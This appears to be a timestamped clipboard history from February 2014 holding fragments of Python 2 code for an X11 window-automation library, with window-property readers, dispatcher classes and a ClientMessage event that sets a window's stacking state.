* Thu 20 Feb 2014 03:19:59 PM JST
from xautohotkey import xconnection
* Thu 20 Feb 2014 03:20:03 PM JST
c=xconnection.Connection()
* Thu 20 Feb 2014 03:20:38 PM JST
self, 
* Thu 20 Feb 2014 03:20:47 PM JST
from xautohotkey import xconnection
* Thu 20 Feb 2014 03:20:50 PM JST
c=xconnection.Connection()
* Thu 20 Feb 2014 04:20:25 PM JST
ConnectonAbstract
* Thu 20 Feb 2014 05:22:24 PM JST
ConnectonAbstract
* Thu 20 Feb 2014 05:22:42 PM JST
xautohotkey
* Thu 20 Feb 2014 05:22:44 PM JST
XCON
* Thu 20 Feb 2014 05:24:19 PM JST
self._display = display
* Thu 20 Feb 2014 05:32:42 PM JST
ConnectionAbstract
* Thu 20 Feb 2014 05:34:17 PM JST
81788974
* Thu 20 Feb 2014 05:35:13 PM JST
ConnectionAbstract.__init__(self, display)
* Thu 20 Feb 2014 05:39:22 PM JST

* Thu 20 Feb 2014 05:39:22 PM JST

* Thu 20 Feb 2014 05:39:22 PM JST
        con = self.get_connection()

* Thu 20 Feb 2014 05:39:24 PM JST
core.
* Thu 20 Feb 2014 05:39:25 PM JST
con.core.
* Thu 20 Feb 2014 05:39:38 PM JST
WindowPropertyAbstract
* Thu 20 Feb 2014 05:40:55 PM JST
81788974
* Thu 20 Feb 2014 05:42:39 PM JST
    def get(self, window_id, delete=False):
        r"""SUMMARY

        get(window_id)

        @Arguments:
        - `window_id`:

        @Return:
        """
        reply = self.property.get_property_reply(
            delete, window_id, self.property_name, self.types)
        return reply.get_full_value()

* Thu 20 Feb 2014 05:43:21 PM JST
    property_name = '_NET_WM_NAME'
    types = 'UTF8_STRING'

* Thu 20 Feb 2014 05:44:24 PM JST
UTF8_STRING_Types
* Thu 20 Feb 2014 05:44:29 PM JST

* Thu 20 Feb 2014 05:44:29 PM JST

* Thu 20 Feb 2014 05:44:29 PM JST
    types = 'UTF8_STRING'

* Thu 20 Feb 2014 05:44:56 PM JST
xautohotkey
* Thu 20 Feb 2014 05:45:05 PM JST
from xautohotkey.window import wproperty
* Thu 20 Feb 2014 05:45:48 PM JST
81788974
* Thu 20 Feb 2014 05:49:20 PM JST
81788974
* Fri 21 Feb 2014 08:13:02 AM JST
class UTF8_STRING_Types(WindowPropertyAbstract):
    r"""
    """
    types = 'UTF8_STRING'



* Fri 21 Feb 2014 08:14:57 AM JST
_NET_WM_VISIBLE_NAME
* Fri 21 Feb 2014 08:17:02 AM JST
class _NET_WM_VISIBLE_NAME(UTF8_STRING_TypesAbstract):
    r"""
    """
    property_name = '_NET_WM_VISIBLE_NAME'

* Fri 21 Feb 2014 08:17:33 AM JST
_NET_WM_ICON_NAME
* Fri 21 Feb 2014 08:17:52 AM JST
_NET_WM_VISIBLE_ICON_NAME
* Fri 21 Feb 2014 08:18:04 AM JST
_NET_WM_DESKTOP
* Fri 21 Feb 2014 08:18:21 AM JST
_NET_WM_WINDOW_TYPE
* Fri 21 Feb 2014 08:18:43 AM JST
_NET_WM_STATE
* Fri 21 Feb 2014 08:19:17 AM JST
_NET_WM_ALLOWED_ACTIONS
* Fri 21 Feb 2014 08:19:43 AM JST
_NET_WM_STRUT
* Fri 21 Feb 2014 08:19:55 AM JST
_NET_WM_STRUT_PARTIAL
* Fri 21 Feb 2014 08:20:07 AM JST
_NET_WM_ICON_GEOMETRY
* Fri 21 Feb 2014 08:20:15 AM JST
_NET_WM_ICON
* Fri 21 Feb 2014 08:20:23 AM JST
_NET_WM_PID
* Fri 21 Feb 2014 08:20:33 AM JST
_NET_WM_HANDLED_ICONS
* Fri 21 Feb 2014 08:20:42 AM JST
_NET_WM_USER_TIME
* Fri 21 Feb 2014 08:20:51 AM JST
_NET_FRAME_EXTENTS
* Fri 21 Feb 2014 08:21:04 AM JST
_OB_APP_TYPE
* Fri 21 Feb 2014 08:22:33 AM JST
_NET_WM_WINDOW_TYPE_DESKTOP
* Fri 21 Feb 2014 08:22:47 AM JST
_NET_WM_WINDOW_TYPE_DOCK
* Fri 21 Feb 2014 08:22:56 AM JST
_NET_WM_WINDOW_TYPE_TOOLBAR
* Fri 21 Feb 2014 08:23:06 AM JST
_NET_WM_WINDOW_TYPE_MENU
* Fri 21 Feb 2014 08:23:15 AM JST
_NET_WM_WINDOW_TYPE_UTILITY
* Fri 21 Feb 2014 08:23:25 AM JST
_NET_WM_WINDOW_TYPE_SPLASH
* Fri 21 Feb 2014 08:24:07 AM JST
_NET_WM_WINDOW_TYPE_SPLASH
* Fri 21 Feb 2014 08:25:11 AM JST
_NET_WM_WINDOW_TYPE
* Fri 21 Feb 2014 08:26:21 AM JST
from xautohotkey import xconnection
* Fri 21 Feb 2014 08:26:23 AM JST
from xautohotkey import xconnection
c=xconnection.Connection()

* Fri 21 Feb 2014 08:27:19 AM JST
_NET_WM_WINDOW_TYPE
* Fri 21 Feb 2014 08:27:52 AM JST
WM_CLASS
* Fri 21 Feb 2014 08:28:56 AM JST
_NET_WM_STATE
* Fri 21 Feb 2014 08:41:10 AM JST
self, 
* Fri 21 Feb 2014 08:42:47 AM JST
self
* Fri 21 Feb 2014 08:44:03 AM JST
property
* Fri 21 Feb 2014 08:44:16 AM JST
type
* Fri 21 Feb 2014 08:47:57 AM JST
pass
* Fri 21 Feb 2014 08:49:15 AM JST
'{} must set attribute "property_name and types"'.format
* Fri 21 Feb 2014 08:49:21 AM JST
self.__class__.__name__
* Fri 21 Feb 2014 08:49:37 AM JST
NotImplementedAttributeError
* Fri 21 Feb 2014 10:21:09 AM JST
[ReplyTypeSTRING,
              ReplyTypeUTF8_STRING,
              ReplyTypeUTF8_STRING_LIST,
              ReplyTypeATOM,
              ReplyTypeCARDINAL,
              ReplyTypeWINDOW]
* Fri 21 Feb 2014 10:22:52 AM JST
.intern_atom
* Fri 21 Feb 2014 10:38:07 AM JST
key
* Fri 21 Feb 2014 10:49:18 AM JST
ReplyDispatcher
* Fri 21 Feb 2014 11:03:21 AM JST
dict_=None, **kwargs
* Fri 21 Feb 2014 11:04:36 AM JST
__metadata__
* Fri 21 Feb 2014 11:10:01 AM JST
LoadDispatcherAbstract
* Fri 21 Feb 2014 11:13:12 AM JST
abstract
* Fri 21 Feb 2014 11:17:45 AM JST
_Iterable
* Fri 21 Feb 2014 11:20:18 AM JST
_NoneType
* Fri 21 Feb 2014 11:20:41 AM JST
TypeType
* Fri 21 Feb 2014 11:20:44 AM JST

* Fri 21 Feb 2014 11:20:50 AM JST
 _NoneType
* Fri 21 Feb 2014 11:20:59 AM JST
ObjectType
* Fri 21 Feb 2014 11:21:25 AM JST
ObjectType, IntType, LongType, FloatType,
                   BooleanType, ComplexType, StringType, UnicodeType,
                   StringTypes, BufferType, TupleType, ListType, DictType,
                   FunctionType, LambdaType, CodeType, GeneratorType, ClassType,
                   UnboundMethodType, InstanceType, MethodType,
                   BuiltinFunctionType, BuiltinMethodType, ModuleType, FileType,
                   XRangeType, TracebackType, FrameType, SliceType,
                   EllipsisType, DictProxyType, NotImplementedType,
                   GetSetDescriptorType, MemberDescriptorType
* Fri 21 Feb 2014 11:22:50 AM JST
ObjectType
* Fri 21 Feb 2014 11:23:02 AM JST
IntType
* Fri 21 Feb 2014 11:23:03 AM JST
LongType
* Fri 21 Feb 2014 11:23:03 AM JST
FloatType
* Fri 21 Feb 2014 11:23:03 AM JST
BooleanType
* Fri 21 Feb 2014 11:23:03 AM JST
ComplexType
* Fri 21 Feb 2014 11:23:03 AM JST
StringType
* Fri 21 Feb 2014 11:23:04 AM JST
UnicodeType
* Fri 21 Feb 2014 11:23:04 AM JST
StringTypes
* Fri 21 Feb 2014 11:23:04 AM JST
BufferType
* Fri 21 Feb 2014 11:23:04 AM JST
TupleType
* Fri 21 Feb 2014 11:23:04 AM JST
ListType
* Fri 21 Feb 2014 11:23:04 AM JST
DictType
* Fri 21 Feb 2014 11:23:05 AM JST
FunctionType
* Fri 21 Feb 2014 11:23:05 AM JST
LambdaType
* Fri 21 Feb 2014 11:23:05 AM JST
CodeType
* Fri 21 Feb 2014 11:23:06 AM JST
GeneratorType
* Fri 21 Feb 2014 11:23:06 AM JST
ClassType
* Fri 21 Feb 2014 11:23:06 AM JST
UnboundMethodType
* Fri 21 Feb 2014 11:23:06 AM JST
InstanceType
* Fri 21 Feb 2014 11:23:07 AM JST
MethodType
* Fri 21 Feb 2014 11:23:07 AM JST
BuiltinFunctionType
* Fri 21 Feb 2014 11:23:07 AM JST
BuiltinMethodType
* Fri 21 Feb 2014 11:23:07 AM JST
ModuleType
* Fri 21 Feb 2014 11:23:07 AM JST
FileType
* Fri 21 Feb 2014 11:23:08 AM JST
XRangeType
* Fri 21 Feb 2014 11:23:08 AM JST
TracebackType
* Fri 21 Feb 2014 11:23:08 AM JST
FrameType
* Fri 21 Feb 2014 11:23:08 AM JST
SliceType
* Fri 21 Feb 2014 11:23:08 AM JST
EllipsisType
* Fri 21 Feb 2014 11:23:09 AM JST
DictProxyType
* Fri 21 Feb 2014 11:23:09 AM JST
NotImplementedType
* Fri 21 Feb 2014 11:23:10 AM JST
GetSetDescriptorType
* Fri 21 Feb 2014 11:23:11 AM JST
MemberDescriptorTyp
* Fri 21 Feb 2014 11:23:17 AM JST
from types import ObjectType as _ObjectType
from types import IntType as _IntType
from types import LongType as _LongType
from types import FloatType as _FloatType
from types import BooleanType as _BooleanType
from types import ComplexType as _ComplexType
from types import StringType as _StringType
from types import UnicodeType as _UnicodeType
from types import StringTypes as _StringTypes
from types import BufferType as _BufferType
from types import TupleType as _TupleType
from types import ListType as _ListType
from types import DictType as _DictType
from types import FunctionType as _FunctionType
from types import LambdaType as _LambdaType
from types import CodeType as _CodeType
from types import GeneratorType as _GeneratorType
from types import ClassType as _ClassType
from types import UnboundMethodType as _UnboundMethodType
from types import InstanceType as _InstanceType
from types import MethodType as _MethodType
from types import BuiltinFunctionType as _BuiltinFunctionType
from types import BuiltinMethodType as _BuiltinMethodType
from types import ModuleType as _ModuleType
from types import FileType as _FileType
from types import XRangeType as _XRangeType
from types import TracebackType as _TracebackType
from types import FrameType as _FrameType
from types import SliceType as _SliceType
from types import EllipsisType as _EllipsisType
from types import DictProxyType as _DictProxyType
from types import NotImplementedType as _NotImplementedType
from types import GetSetDescriptorType as _GetSetDescriptorType
from types import MemberDescriptorTyp as _MemberDescriptorTyp
* Fri 21 Feb 2014 11:23:50 AM JST
NoneType
* Fri 21 Feb 2014 11:24:07 AM JST
_NoneType
* Fri 21 Feb 2014 11:24:28 AM JST
NoneType
* Fri 21 Feb 2014 11:24:46 AM JST
NoneType
* Fri 21 Feb 2014 11:25:31 AM JST
TypeType
* Fri 21 Feb 2014 11:25:38 AM JST
ObjectType
* Fri 21 Feb 2014 11:25:42 AM JST
IntType
* Fri 21 Feb 2014 11:25:44 AM JST
LongType
* Fri 21 Feb 2014 11:25:46 AM JST
FloatType
* Fri 21 Feb 2014 11:25:48 AM JST
BooleanType
* Fri 21 Feb 2014 11:25:50 AM JST
ComplexType
* Fri 21 Feb 2014 11:25:58 AM JST
ComplexType
* Fri 21 Feb 2014 11:26:04 AM JST
StringType
* Fri 21 Feb 2014 11:26:12 AM JST
UnicodeType
* Fri 21 Feb 2014 11:26:30 AM JST
BufferType
* Fri 21 Feb 2014 11:26:33 AM JST
TupleType
* Fri 21 Feb 2014 11:26:36 AM JST
ListType
* Fri 21 Feb 2014 11:26:39 AM JST
DictType
* Fri 21 Feb 2014 11:26:41 AM JST
FunctionType
* Fri 21 Feb 2014 11:26:49 AM JST
LambdaType
* Fri 21 Feb 2014 11:26:52 AM JST
CodeType
* Fri 21 Feb 2014 11:26:58 AM JST
GeneratorType
* Fri 21 Feb 2014 11:27:01 AM JST
ClassType
* Fri 21 Feb 2014 11:27:03 AM JST
UnboundMethodType
* Fri 21 Feb 2014 11:27:06 AM JST
InstanceType
* Fri 21 Feb 2014 11:27:09 AM JST
MethodType
* Fri 21 Feb 2014 11:28:01 AM JST
BuiltinFunctionType
* Fri 21 Feb 2014 11:28:16 AM JST
BuiltinMethodType
* Fri 21 Feb 2014 11:28:29 AM JST
BuiltinFunctionType
* Fri 21 Feb 2014 11:28:31 AM JST
BuiltinMethodType
* Fri 21 Feb 2014 11:28:34 AM JST
ModuleType
* Fri 21 Feb 2014 11:28:36 AM JST
FileType
* Fri 21 Feb 2014 11:28:43 AM JST
XRangeType
* Fri 21 Feb 2014 11:28:46 AM JST
TracebackType
* Fri 21 Feb 2014 11:31:39 AM JST
        if not predicate.isiterable(self._list):
            raise StandardError()

* Fri 21 Feb 2014 11:34:44 AM JST
        if not predicate.isiterable(self._list):
            raise StandardError()


* Fri 21 Feb 2014 11:34:52 AM JST
Standard
* Fri 21 Feb 2014 11:37:17 AM JST
.__str__()
* Fri 21 Feb 2014 11:37:19 AM JST
print 
* Fri 21 Feb 2014 11:38:32 AM JST
type 
* Fri 21 Feb 2014 11:38:33 AM JST
given type 
* Fri 21 Feb 2014 11:40:09 AM JST
"'{}' object is not iterable".format
* Fri 21 Feb 2014 11:40:49 AM JST
_
* Fri 21 Feb 2014 11:40:50 AM JST
self._
* Fri 21 Feb 2014 11:40:56 AM JST
NotIterableError
* Fri 21 Feb 2014 11:44:03 AM JST
make
* Fri 21 Feb 2014 11:44:37 AM JST

* Fri 21 Feb 2014 11:44:37 AM JST

* Fri 21 Feb 2014 11:44:37 AM JST
from abc import abstractmethod, ABCMeta

* Fri 21 Feb 2014 11:45:26 AM JST
LoadDispatcherAbstract
* Fri 21 Feb 2014 11:51:21 AM JST
AtomIdentifier.get_instance(display=self.display)
        intern_atom = identifier.intern_atom
* Fri 21 Feb 2014 11:51:35 AM JST
.intern_atom
* Fri 21 Feb 2014 11:51:37 AM JST

* Fri 21 Feb 2014 11:51:37 AM JST

* Fri 21 Feb 2014 11:51:37 AM JST
        intern_atom = identifier.intern_atom

* Fri 21 Feb 2014 11:52:49 AM JST
intern_atom(klass.type_name)
* Fri 21 Feb 2014 11:53:13 AM JST
klass
* Fri 21 Feb 2014 11:54:14 AM JST
MakeReplyTypeDispatcher
* Fri 21 Feb 2014 11:56:26 AM JST
    _types_list = (ReplyTypeSTRING,
                   ReplyTypeUTF8_STRING,
                   ReplyTypeUTF8_STRING_LIST,
                   ReplyTypeATOM,
                   ReplyTypeCARDINAL,
                   ReplyTypeWINDOW)

* Fri 21 Feb 2014 11:56:51 AM JST
MakeReplyTypeDispatcher
* Fri 21 Feb 2014 11:57:26 AM JST
list_, 
* Fri 21 Feb 2014 11:57:32 AM JST
MakeReplyTypeDispatcher
* Fri 21 Feb 2014 11:57:38 AM JST

* Fri 21 Feb 2014 11:57:50 AM JST
MakeReplyTypeDispatcher
* Fri 21 Feb 2014 11:58:21 AM JST
xautoho
* Fri 21 Feb 2014 11:58:22 AM JST
from xautoho
* Fri 21 Feb 2014 11:58:23 AM JST
impor
* Fri 21 Feb 2014 11:59:56 AM JST
81788974
* Fri 21 Feb 2014 12:01:22 PM JST
load_dispatcher
* Fri 21 Feb 2014 12:02:51 PM JST
81788974
* Fri 21 Feb 2014 12:08:03 PM JST
type_
* Fri 21 Feb 2014 12:17:53 PM JST
    def _get_key(self, elm):
        r"""SUMMARY

        _get_key(elm)

        @Arguments:
        - `elm`:

        @Return:
        """
        if hasattr(elm, 'type_name'):
            return self.intern_atom(elm.type_name)
        return None

    def _get_value(self, elm):
        r"""SUMMARY

        get_value(elm)

        @Arguments:
        - `elm`:

        @Return:
        """
        return elm

* Fri 21 Feb 2014 12:22:12 PM JST
Make
* Fri 21 Feb 2014 12:23:09 PM JST
ReplyDispatcher, 
* Fri 21 Feb 2014 12:25:06 PM JST
load
* Fri 21 Feb 2014 12:25:42 PM JST

* Fri 21 Feb 2014 12:25:43 PM JST

* Fri 21 Feb 2014 12:25:43 PM JST
        # self._dispatcher = ReplyDispatcher(display=self.display)

* Fri 21 Feb 2014 04:51:05 PM JST

* Fri 21 Feb 2014 04:51:06 PM JST

* Fri 21 Feb 2014 04:51:06 PM JST
        if hasattr(elm, self._key_attr_name):

* Fri 21 Feb 2014 05:00:20 PM JST
class NotImplementedAttributeError(NotImplementedError):
    r"""
    """
    def __str__(self, ):
        r"""SUMMARY

        __str__()

        @Return:
        """
        fmt = '{} must set attribute "property_name and types"'.format
        return fmt(self.__class__.__name__)



* Fri 21 Feb 2014 05:01:37 PM JST
from xautohotkey.error import NotImplementedAttributeError
* Fri 21 Feb 2014 05:01:53 PM JST
class NotImplementedAttributeError(NotImplementedError):
    r"""
    """
    def __str__(self, ):
        r"""SUMMARY

        __str__()

        @Return:
        """
        fmt = '{} must set attribute "property_name and types"'.format
        return fmt(self.__class__.__name__)

* Fri 21 Feb 2014 05:02:06 PM JST
NotImplementedAttributeError
* Fri 21 Feb 2014 05:02:58 PM JST
self
* Fri 21 Feb 2014 05:04:45 PM JST
attr_name
* Fri 21 Feb 2014 05:04:49 PM JST

* Fri 21 Feb 2014 05:04:49 PM JST

* Fri 21 Feb 2014 05:04:49 PM JST
        self._attr_name = attr_name

* Fri 21 Feb 2014 05:05:37 PM JST

* Fri 21 Feb 2014 05:05:37 PM JST

* Fri 21 Feb 2014 05:05:37 PM JST
       if not hasattr(cls, '_attr_name'):

* Fri 21 Feb 2014 05:05:49 PM JST
DispatchSetKeyByAttribute
* Fri 21 Feb 2014 05:07:51 PM JST
class NotImplementedAttributeError(NotImplementedError):
    r"""
    """
    def __str__(self, ):
        r"""SUMMARY

        __str__()

        @Return:
        """
        fmt = '{} must set attribute "property_name and types"'.format
        return fmt(self.__class__.__name__)

* Fri 21 Feb 2014 05:59:54 PM JST
        if not predicate.isiterable(list_):
            raise NotIterableError(list_)

        self._list = list_

* Fri 21 Feb 2014 06:00:06 PM JST
    @abstractmethod
    def _get_key(self, elm):
        raise NotImplementedError()

    @abstractmethod
    def _get_value(self, elm):
        raise NotImplementedError()

* Fri 21 Feb 2014 06:01:52 PM JST
self, 
* Fri 21 Feb 2014 06:02:58 PM JST
self
* Fri 21 Feb 2014 06:04:01 PM JST

* Fri 21 Feb 2014 06:04:01 PM JST

* Fri 21 Feb 2014 06:04:01 PM JST
        return ''

* Fri 21 Feb 2014 06:04:12 PM JST
return ''
* Fri 21 Feb 2014 06:04:27 PM JST
@abc.abstractmethod
* Fri 21 Feb 2014 06:09:33 PM JST
self
* Fri 21 Feb 2014 06:09:40 PM JST
self, 
* Fri 21 Feb 2014 06:10:29 PM JST
predicate.
* Fri 21 Feb 2014 06:11:04 PM JST
getattr()
* Fri 21 Feb 2014 06:11:18 PM JST
from
* Fri 21 Feb 2014 06:14:29 PM JST
_list
* Fri 21 Feb 2014 06:16:13 PM JST
predicate.
* Fri 21 Feb 2014 06:16:30 PM JST
dict_=None, **kwargs
* Fri 21 Feb 2014 06:19:58 PM JST

* Fri 21 Feb 2014 06:19:58 PM JST

* Fri 21 Feb 2014 06:19:58 PM JST
    must implement '_list'

* Fri 21 Feb 2014 06:20:04 PM JST
_list
* Fri 21 Feb 2014 06:24:25 PM JST
class Sample1(object):
    r"""
    """
    name = 'hello'

    def __call__(self,*args, **kwargs):
        r"""SUMMARY
        
        __call__()
        
        @Return:
        """
        print('hello world')

* Fri 21 Feb 2014 06:24:33 PM JST
hello
* Fri 21 Feb 2014 06:24:36 PM JST
hello 
* Fri 21 Feb 2014 06:30:06 PM JST
hello
* Fri 21 Feb 2014 06:33:54 PM JST
DispatchMaker
* Fri 21 Feb 2014 06:34:21 PM JST
DispatchableListABC
* Fri 21 Feb 2014 06:36:41 PM JST

* Fri 21 Feb 2014 06:36:41 PM JST

* Fri 21 Feb 2014 06:36:41 PM JST
    @staticmethod

* Fri 21 Feb 2014 06:36:52 PM JST
        if not isinstance(obj, DispatchableListABC):
            raise ValueError()

* Fri 21 Feb 2014 06:37:13 PM JST
klass, 
* Fri 21 Feb 2014 06:37:17 PM JST

* Fri 21 Feb 2014 06:37:17 PM JST

* Fri 21 Feb 2014 06:37:17 PM JST
        obj = klass()

* Fri 21 Feb 2014 06:48:50 PM JST
    def make_dispatch(self, dict_=None, **kwargs):
        r"""SUMMARY

        make_dispatch(klass)

        @Arguments:
        - `klass`:

        @Return:
        """
        if not isinstance(self._obj, DispatchableListABC):
            raise ValueError()
        dispatcher = DispatchMaker._dispatcher(dict_, **kwargs)
        for elm in self._obj.get_list():
            dispatcher.register(self._obj.get_key(elm),
                                self._obj.get_value(elm))
        return dispatcher

* Fri 21 Feb 2014 06:49:38 PM JST
_dispatcher = Dispatcher
* Fri 21 Feb 2014 06:51:02 PM JST

* Fri 21 Feb 2014 06:51:02 PM JST

* Fri 21 Feb 2014 06:51:02 PM JST
        obj = super(DispatchableListABC, self).make_dispatch(dict_=None, **kwargs)

* Fri 21 Feb 2014 06:52:20 PM JST
    def make_dispatch(self, dict_=None, **kwargs):
        r"""SUMMARY

        make_dispatch(klass)

        @Arguments:
        - `klass`:

        @Return:
        """
        if not isinstance(self._obj, DispatchableListABC):
            raise ValueError()
        dispatcher = DispatchMaker._dispatcher(dict_, **kwargs)
        for elm in self._obj.get_list():
            dispatcher.register(self._obj.get_key(elm),
                                self._obj.get_value(elm))
        return dispatcher

* Fri 21 Feb 2014 06:52:46 PM JST
_obj
* Fri 21 Feb 2014 06:52:49 PM JST
_obj
* Fri 21 Feb 2014 06:52:52 PM JST
_obj
* Fri 21 Feb 2014 06:53:26 PM JST

* Fri 21 Feb 2014 06:53:26 PM JST

* Fri 21 Feb 2014 06:53:27 PM JST
    _dispatcher = Dispatcher

* Fri 21 Feb 2014 06:55:14 PM JST
DispatchableListABC
* Fri 21 Feb 2014 06:55:20 PM JST
DispatchF
* Fri 21 Feb 2014 10:36:34 PM JST
elm
* Fri 21 Feb 2014 10:39:02 PM JST
MakeDispatchFromListABC
* Fri 21 Feb 2014 10:40:15 PM JST
    _types_list = (ReplyTypeSTRING,
                   ReplyTypeUTF8_STRING,
                   ReplyTypeUTF8_STRING_LIST,
                   ReplyTypeATOM,
                   ReplyTypeCARDINAL,
                   ReplyTypeWINDOW)

* Fri 21 Feb 2014 10:40:52 PM JST
        if hasattr(elm, 'type_name'):
            return self.intern_atom(elm.type_name)
        return None

* Fri 21 Feb 2014 10:41:17 PM JST
        self.intern_atom = (AtomIdentifier
                            .get_instance(display=self.display)
                            .intern_atom)

* Fri 21 Feb 2014 10:43:15 PM JST
ReplyDispatchMaker
* Fri 21 Feb 2014 10:44:44 PM JST
xconnection
* Fri 21 Feb 2014 10:45:56 PM JST
81788974
* Fri 21 Feb 2014 10:48:07 PM JST
class WindowPropertyAbstract(ConnectionAbstract):
    r"""
    """
    property_name = ''
    types = ''

    def __new__(cls, *args, **kwargs):
        if not cls.property_name or not cls.types:
            raise NotImplementedAttributeError()
        return super(WindowPropertyAbstract, cls).__new__(cls, *args, **kwargs)

    def __init__(self, display=None):
        r"""

        @Arguments:
        - `display`:
        """
        ConnectionAbstract.__init__(self, display)
        self.property = self.get_connection().core.property

    def get(self, window_id, delete=False):
        r"""SUMMARY

        get(window_id)

        @Arguments:
        - `window_id`:

        @Return:
        """
        reply = self.property.get_property_reply(
            delete, window_id, self.property_name, self.types)
        return reply.get_full_value()

* Fri 21 Feb 2014 10:50:01 PM JST
self.get_connection().core.property
* Fri 21 Feb 2014 10:50:22 PM JST
get_property_reply
* Fri 21 Feb 2014 10:51:07 PM JST
property.
* Fri 21 Feb 2014 10:51:08 PM JST
self.property.
* Fri 21 Feb 2014 10:51:09 PM JST
            
* Fri 21 Feb 2014 10:51:22 PM JST

* Fri 21 Feb 2014 10:51:22 PM JST

* Fri 21 Feb 2014 10:51:22 PM JST
        self.property = self.get_connection().core.property

* Fri 21 Feb 2014 11:27:06 PM JST
WindowPropertyHandler
* Fri 21 Feb 2014 11:30:51 PM JST
from xautohotkey.window.wproperty import 
* Fri 21 Feb 2014 11:31:57 PM JST
81788974
* Fri 21 Feb 2014 11:32:08 PM JST
'_NET_WM_PID'
* Fri 21 Feb 2014 11:32:46 PM JST
'WM_STATE'
* Fri 21 Feb 2014 11:34:14 PM JST
'_NET_WM_STATE'
* Fri 21 Feb 2014 11:59:31 PM JST
    def __getitem__(self, key):
        if key in self.data:
            return self.data[key]
        if hasattr(self.__class__, "__missing__"):
            return self.__class__.__missing__(self, key)
        raise KeyError(key)

* Sat 22 Feb 2014 12:00:00 AM JST
data
* Sat 22 Feb 2014 12:02:57 AM JST
WindowPropertyHandlerDispatcher
* Sat 22 Feb 2014 12:04:39 AM JST
from xautohotkey.window.wproperty import WindowPropertyHandlerDispatcher
* Sat 22 Feb 2014 12:05:19 AM JST
WindowPropertyHandlerDispatcher
* Sat 22 Feb 2014 12:06:55 AM JST
81788974
* Sat 22 Feb 2014 12:26:48 AM JST
xconnection
* Sat 22 Feb 2014 12:27:00 AM JST
WindowPropertyHandler
* Sat 22 Feb 2014 12:27:10 AM JST
WindowPropertyHandlers
* Sat 22 Feb 2014 12:28:13 AM JST

* Sat 22 Feb 2014 12:28:13 AM JST

* Sat 22 Feb 2014 12:28:13 AM JST
        self.property = WindowPropertyHandlers(display=self.display)

* Sat 22 Feb 2014 12:28:17 AM JST

* Sat 22 Feb 2014 12:28:17 AM JST

* Sat 22 Feb 2014 12:28:17 AM JST
from xautohotkey.window.wproperty import WindowPropertyHandlers

* Sat 22 Feb 2014 12:35:09 AM JST
hello
* Sat 22 Feb 2014 12:35:35 AM JST
world
* Sat 22 Feb 2014 07:45:42 AM JST
_
* Sat 22 Feb 2014 07:45:43 AM JST
self._
* Sat 22 Feb 2014 07:46:08 AM JST
self._cache_map[self.display]
* Sat 22 Feb 2014 07:54:02 AM JST
from xautohotkey.xconnection import ConnectionAbstract
* Sat 22 Feb 2014 07:54:40 AM JST

* Sat 22 Feb 2014 07:54:40 AM JST

* Sat 22 Feb 2014 07:54:40 AM JST
        self._display = display

* Sat 22 Feb 2014 07:56:34 AM JST
self.get_connection().core
                              .property.get_property_reply
* Sat 22 Feb 2014 07:57:03 AM JST
WindowPropertyHandlers
* Sat 22 Feb 2014 07:57:42 AM JST
wproperty
* Sat 22 Feb 2014 08:00:35 AM JST
from xautohotkey.window import state
* Sat 22 Feb 2014 08:01:17 AM JST
54525997
* Sat 22 Feb 2014 08:14:21 AM JST
from
* Sat 22 Feb 2014 08:15:21 AM JST
SendEvent
* Sat 22 Feb 2014 08:15:42 AM JST
SubstructureRedirect
* Sat 22 Feb 2014 08:18:29 AM JST
SubstructureRedirect=xproto.EventMask.SubstructureRedirect
* Sat 22 Feb 2014 08:19:37 AM JST
event=struct.pack('BBHII5I', 33, 32, 0, acwin.id, _NET_WM_STATE, mode, ABOVE, 0, 0, 0)
* Sat 22 Feb 2014 08:21:24 AM JST
event=struct.pack('BBHII5I', 33, 32, 0, acwin.id, _NET_WM_STATE, mode, ABOVE, 0, 0, 0)
* Sat 22 Feb 2014 08:22:06 AM JST
_NET_WM_STATE
* Sat 22 Feb 2014 08:22:38 AM JST
_MODE_SET = 1
* Sat 22 Feb 2014 08:23:59 AM JST
_NET_WM_STATE
* Sat 22 Feb 2014 08:24:46 AM JST
'_NET_WM_STATE_ABOVE'
* Sat 22 Feb 2014 08:25:54 AM JST
54544559
* Sat 22 Feb 2014 08:26:17 AM JST
event=struct.pack('BBHII5I', 33, 32, 0, acwin.id, _NET_WM_STATE, mode, ABOVE, 0, 0, 0)
* Sat 22 Feb 2014 08:26:31 AM JST
54544559
* Sat 22 Feb 2014 08:27:27 AM JST
_MODE_SET
* Sat 22 Feb 2014 08:28:08 AM JST
296
* Sat 22 Feb 2014 08:29:27 AM JST
c.core.SendEvent(0, acwin.id, SubstructureRedirect, event)
* Sat 22 Feb 2014 08:29:44 AM JST
54544559
* Sat 22 Feb 2014 08:33:12 AM JST
0xffffff
* Sat 22 Feb 2014 08:34:25 AM JST
'_NET_WM_STATE_BELOW'
* Sat 22 Feb 2014 08:35:08 AM JST
_MODE_TOGGLE = 2
* Sat 22 Feb 2014 08:37:14 AM JST
SendEventDest
* Sat 22 Feb 2014 08:37:33 AM JST
xcb.xproto.SendEventDest
* Sat 22 Feb 2014 09:08:18 AM JST
ClientMessageEvent
* Sat 22 Feb 2014 09:10:38 AM JST
ClientMessageEvent 
* Sat 22 Feb 2014 09:39:25 AM JST
ClientMessageEvent
* Sat 22 Feb 2014 09:39:40 AM JST
core
* Sat 22 Feb 2014 09:41:40 AM JST
xcb.xproto.ClientMessageEvent
* Sat 22 Feb 2014 09:49:33 AM JST
KeyPressEvent
* Sat 22 Feb 2014 09:51:00 AM JST
    'KeyPressEvent': 2,
    'KeyReleaseEvent': 3,
    'ButtonPressEvent': 4,
    'ButtonReleaseEvent': 5,
    'MotionNotifyEvent': 6,
    'EnterNotifyEvent': 7,
    'LeaveNotifyEvent': 8,
    'FocusInEvent': 9,
    'FocusOutEvent': 10,
    'KeymapNotifyEvent': 11,
    'ExposeEvent': 12,
    'GraphicsExposureEvent': 13,
    'NoExposureEvent': 14,
    'VisibilityNotifyEvent': 15,
    'CreateNotifyEvent': 16,
    'DestroyNotifyEvent': 17,
    'UnmapNotifyEvent': 18,
    'MapNotifyEvent': 19,
    'MapRequestEvent': 20,
    'ReparentNotifyEvent': 21,
    'ConfigureNotifyEvent': 22,
    'ConfigureRequestEvent': 23,
    'GravityNotifyEvent': 24,
    'ResizeRequestEvent': 25,
    'CirculateNotifyEvent': 26,
    'CirculateRequestEvent': 27,
    'PropertyNotifyEvent': 28,
    'SelectionClearEvent': 29,
    'SelectionRequestEvent': 30,
    'SelectionNotifyEvent': 31,
    'ColormapNotifyEvent': 32,
    'ClientMessageEvent': 33,
    'MappingNotifyEvent': 34,

* Sat 22 Feb 2014 09:53:23 AM JST
,
* Sat 22 Feb 2014 09:53:24 AM JST
,
